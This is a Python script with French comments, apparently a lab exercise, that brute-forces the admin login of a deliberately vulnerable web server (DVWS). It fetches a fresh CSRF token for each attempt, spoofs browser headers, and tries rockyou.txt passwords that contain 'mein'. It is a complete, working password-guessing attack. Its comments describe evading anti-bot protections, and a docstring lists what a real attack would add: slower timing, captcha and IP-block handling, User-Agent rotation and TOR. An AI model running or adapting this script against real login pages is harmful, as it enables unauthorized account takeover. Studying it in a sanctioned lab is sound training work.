"""
Script de brute force utilisant BeautifulSoup et la wordlist rockyou 
pour trouver le mot de passe de l'utilisateur admin sur DVWS
Filtre sp√©cifiquement les mots de passe contenant "mein"
"""

# === IMPORTS ===
import requests  # Pour envoyer des requ√™tes HTTP (GET, POST)
import time      # Pour ajouter des d√©lais entre les tentatives
from bs4 import BeautifulSoup  # Pour parser le HTML et extraire des donn√©es

# === CONFIGURATION ===
TARGET_URL = "http://10.0.1.10:5780/website/login.php"  # URL de la page de connexion de Damn Vulnerable Web Server (DVWS)
USERNAME = "admin"  # Nom d'utilisateur par d√©faut (on sait que c'est "admin")
DELAY = 0.01  # D√©lai en secondes entre chaque tentative (pour √©viter la surcharge du serveur)
ROCKYOU_FILE = "rockyou.txt"  # Fichier contenant la wordlist de mots de passe (on sit que le mdp est dans le fichier rockyou.txt)



"""
‚ö†Ô∏è Limitations dans un vrai cas :
1. D√©lai trop court :
‚ùå D√©tectable : Les serveurs bloquent les attaques trop rapides
‚ùå Recommand√© : 1-5 secondes entre tentatives
2. Pas de gestion des blocages :
‚ùå Manque : D√©tection des captchas
‚ùå Manque : Gestion des IP bloqu√©es
‚ùå Manque : Rotation des User-Agents
3. Pas de proxy/TOR :
‚ùå Tra√ßable : L'IP d'attaque est visible
‚ùå Risqu√© : Pas d'anonymisation
"""


def get_csrf_token(session):
    """
    R√©cup√®re le token CSRF (Cross-Site Request Forgery) de la page de connexion.
    
    POURQUOI CETTE FONCTION EST N√âCESSAIRE :
    - Le serveur DVWS exige un token CSRF valide pour chaque requ√™te POST
    - Sans ce token, toutes les tentatives de connexion √©chouent imm√©diatement
    - Le token change √† chaque session, donc on doit le r√©cup√©rer √† chaque tentative
    
    COMMENT √áA MARCHE :
    1. On fait une requ√™te GET vers la page de connexion
    2. On parse le HTML avec BeautifulSoup pour extraire le token
    3. On retourne la valeur du token pour l'utiliser dans la requ√™te POST
    """
    
    try:
        # === √âTAPE 1 : R√©cup√©rer la page de connexion ===
        # On fait une requ√™te GET vers la page de login pour obtenir le formulaire HTML
        response = session.get(TARGET_URL, timeout=10)
        
        # V√©rifier que la requ√™te a r√©ussi (code 200 = OK)
        if response.status_code == 200:
            # === √âTAPE 2 : Parser le HTML avec BeautifulSoup ===
            # BeautifulSoup transforme le HTML en un arbre d'objets Python navigable
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # === √âTAPE 3 : Chercher l'input contenant le token CSRF ===
            # On cherche un √©l√©ment <input> avec l'attribut name="user_token"
            # C'est l√† que le serveur cache le token CSRF dans le formulaire
            token_input = soup.find('input', {'name': 'user_token'})
            
            # === √âTAPE 4 : Extraire la valeur du token ===
            # Si on trouve l'input et qu'il a une valeur, on la retourne
            if token_input and token_input.get('value'):
                return token_input.get('value')
            else:
                raise ValueError("Token CSRF non trouv√© dans la page")
        else:
            raise RuntimeError(f"Erreur lors de la requ√™te: code {response.status_code}")
            
    except requests.exceptions.RequestException as e:
        # En cas d'erreur r√©seau, on l√®ve une exception avec plus de d√©tails
        raise RuntimeError(f"Erreur de connexion au serveur: {str(e)}")



def test_login(username, password, session):
    """
    Teste une combinaison nom d'utilisateur/mot de passe.
    
    POURQUOI CETTE FONCTION EST CRUCIALE :
    - C'est le c≈ìur de l'attaque par brute force
    - Elle simule une tentative de connexion l√©gitime
    - Elle analyse la r√©ponse pour d√©terminer si le mot de passe est correct
    
    COMMENT √áA MARCHE :
    1. R√©cup√©rer un token CSRF valide
    2. Pr√©parer les headers pour ressembler √† un navigateur
    3. Envoyer la requ√™te POST avec les identifiants
    4. Analyser la r√©ponse pour d√©tecter succ√®s/√©chec
    """
    
    # === √âTAPE 1 : R√©cup√©rer le token CSRF ===
    # On doit r√©cup√©rer un token CSRF pour chaque tentative
    csrf_token = get_csrf_token(session)
    
    # === √âTAPE 2 : Pr√©parer les headers pour simuler un navigateur ===
    # Les headers sont n√©cessaires car:
    # 1. Certains sites bloquent les requ√™tes qui ne viennent pas de navigateurs
    # 2. Ils permettent d'√©viter la d√©tection de bots/scripts automatis√©s
    # 3. Ils aident √† contourner les protections anti-bruteforce basiques
    # 4. Ils simulent un comportement humain normal pour ne pas √™tre bloqu√©
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'fr-FR,fr;q=0.9,en;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Content-Type': 'application/x-www-form-urlencoded',  # Format des donn√©es du formulaire
        'Referer': TARGET_URL  # Page d'o√π vient la requ√™te (pour la s√©curit√©)
    }
    
    # === √âTAPE 3 : Pr√©parer les donn√©es du formulaire ===
    # Ces donn√©es correspondent exactement aux champs du formulaire HTML
    data = {
        'username': username,        # Nom d'utilisateur √† tester
        'password': password,        # Mot de passe √† tester
        'user_token': csrf_token,   # Token CSRF (OBLIGATOIRE!)
        'Login': 'Login'            # Bouton de soumission du formulaire
    }
    
    try:
        # === √âTAPE 4 : Envoyer la requ√™te POST ===
        # C'est ici qu'on teste r√©ellement la combinaison username/password
        response = session.post(TARGET_URL, data=data, headers=headers, timeout=10)
        
        # === √âTAPE 5 : Analyser la r√©ponse ===
        if response.status_code == 200:
            # Parser la r√©ponse HTML pour extraire les informations
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # === D√âTECTION DES MESSAGES D'ERREUR ===
            # On cherche des messages d'erreur sp√©cifiques dans la page
            error_message = soup.find('div', class_='message')
            if error_message:
                error_text = error_message.get_text().strip()
                
                # Diff√©rents types d'erreurs possibles sur cette page
                if "Bad password" in error_text:
                    return False, "Mauvais mot de passe"
                elif "Login failed" in error_text:
                    return False, "√âchec de connexion"
               
            
            # === D√âTECTION DES INDICATEURS DE SUCC√àS ===
            # On cherche des mots-cl√©s qui indiquent une connexion r√©ussie
            if any(indicator in response.text.lower() for indicator in [
                "welcome", "dashboard", "logout", "admin panel", "home",
                "success", "logged in", "authentication successful"
            ]):
                return True, "Connexion r√©ussie!"
            
            # === D√âTECTION DE REDIRECTION ===
            # Si on est redirig√© vers une autre page, c'est souvent un signe de succ√®s
            elif response.url != TARGET_URL:
                return True, "Connexion r√©ussie (redirection d√©tect√©e)!"
            
            # === CAS AMBIGU ===
            # Si aucun message clair, on consid√®re que c'est un √©chec
            else:
                return False, "√âchec silencieux (aucun message d'erreur/succ√®s)"
        else:
            # Erreur HTTP (404, 500, etc.)
            return False, f"Erreur HTTP: {response.status_code}"
            
    except requests.exceptions.RequestException as e:
        # Erreur r√©seau (timeout, connexion refus√©e, etc.)
        return False, f"Erreur de connexion: {str(e)}"



def load_rockyou_passwords_with_mein(filename):
    """
    Charge les mots de passe depuis la wordlist rockyou en filtrant ceux contenant "mein".
    
    POURQUOI CETTE FONCTION EST IMPORTANTE :
    - Rockyou.txt contient 14 millions de mots de passe r√©els
    - Le filtre "mein" r√©duit drastiquement le nombre de tests (indice dans le sujet)
    
    COMMENT √áA MARCHE :
    1. Ouvrir le fichier rockyou.txt
    2. Lire chaque ligne (un mot de passe par ligne)
    3. Filtrer seulement ceux contenant "mein"
    4. Retourner la liste filtr√©e
    """
    passwords = []  # Liste pour stocker les mots de passe filtr√©s
    
    try:
        # === √âTAPE 1 : Ouvrir le fichier rockyou.txt ===
        # 'utf-8' : encodage pour supporter les caract√®res sp√©ciaux
        # 'errors='ignore'' : ignorer les caract√®res non d√©codables
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            
            # === √âTAPE 2 : Lire chaque ligne du fichier ===
            for line in f:
                # Nettoyer la ligne (enlever espaces, retours √† la ligne)
                password = line.strip()
                
                # === √âTAPE 3 : Appliquer le filtre "mein" ===
                if "mein" in password.lower():
                    passwords.append(password)
        
        # Afficher le nombre de mots de passe trouv√©s
        print(f"üìö {len(passwords)} mots de passe contenant 'mein' trouv√©s dans {filename}")
        return passwords
        
    except FileNotFoundError:
        # Le fichier rockyou.txt non trouve
        print(f"‚ùå Fichier {filename} non trouv√©")
        return []
    except Exception as e:
        # Autre erreur (permissions, corruption, etc.)
        print(f"‚ùå Erreur lors du chargement de {filename}: {str(e)}")
        return []

        

def main():
    """
    Fonction principale qui orchestre l'attaque par force brute.

    COMMENT √áA MARCHE :
    1. Afficher les informations de l'attaque
    2. Charger les mots de passe filtr√©s
    3. Cr√©er une session HTTP persistante
    4. Tester chaque mot de passe un par un
    5. Afficher les r√©sultats finaux
    """
    
    # === √âTAPE 1 : Afficher les informations de l'attaque ===
    print(f"üîç Recherche du mot de passe pour l'utilisateur '{USERNAME}'")
    print(f"üéØ Cible: {TARGET_URL}")
    print(f"üìö Utilisation de la wordlist: {ROCKYOU_FILE}")
    print(f"üîç Filtre: mots de passe contenant 'mein'")
    print(f"üîê Gestion du token CSRF avec BeautifulSoup")
    print("=" * 60)
    
    # === √âTAPE 2 : Charger les mots de passe filtr√©s ===
    # On charge seulement les mots de passe contenant "mein" pour optimiser l'attaque
    passwords = load_rockyou_passwords_with_mein(ROCKYOU_FILE)
    
    # V√©rifier qu'on a trouv√© des mots de passe √† tester
    if not passwords:
        print("‚ùå Aucun mot de passe contenant 'mein' trouv√©. Arr√™t du script.")
        return
    
    # === √âTAPE 3 : Afficher un aper√ßu des mots de passe √† tester ===
    print(f"üìù Mots de passe √† tester: {len(passwords)}")

    
    # === √âTAPE 4 : Cr√©er une session HTTP persistante ===
    # Une session permet de maintenir les cookies et la connexion
    # C'est plus efficace que de cr√©er une nouvelle connexion √† chaque requ√™te
    session = requests.Session()
    
    # Liste pour stocker les mots de passe qui fonctionnent
    successful_passwords = []
    
    # === √âTAPE 5 : Boucle principale de l'attaque ===
    # On teste chaque mot de passe un par un
    for i, password in enumerate(passwords, 1):
        # Afficher le progr√®s de l'attaque
        width = len(str(len(passwords)))
        space = max(len(password) for password in passwords)
        print(f"[{i:{width}d}/{len(passwords)}] Test: {password:<{space}}", end=" ")
        
        # === TESTER LA COMBINAISON USERNAME/PASSWORD ===
        # C'est ici qu'on appelle la fonction test_login pour chaque tentative
        success, message = test_login(USERNAME, password, session)
        
        # === ANALYSER LE R√âSULTAT ===
        if success:
            # SUCC√àS : On a trouv√© le bon mot de passe !
            print(f"‚úÖ {message}")
            successful_passwords.append(password)
            print(f"\nüéâ MOT DE PASSE TROUV√â: '{password}'")
            break  # Arr√™ter l'attaque d√®s qu'on trouve le bon mot de passe
        else:
            # √âCHEC : Afficher le message d'erreur et continuer
            print(f"‚ùå {message}")
        
        # === D√âLAI ENTRE LES TENTATIVES ===
        # Important pour √©viter de surcharger le serveur et d'√™tre d√©tect√©
        if i < len(passwords):
            time.sleep(DELAY)
    
    # === √âTAPE 6 : Afficher les r√©sultats finaux ===
    print("\n" + "=" * 60)
    if successful_passwords:
        print(f"‚úÖ Mot(s) de passe trouv√©(s): {', '.join(successful_passwords)}")
    else:
        print("‚ùå Aucun mot de passe trouv√© parmi ceux contenant 'mein'")
        print(f"üí° {len(passwords)} mots de passe test√©s")

# === POINT D'ENTR√âE DU SCRIPT ===
# Cette condition v√©rifie si le script est ex√©cut√© directement (pas import√©)
# C'est une bonne pratique Python pour les scripts ex√©cutables
if __name__ == "__main__":
    main()  # Lancer la fonction principale
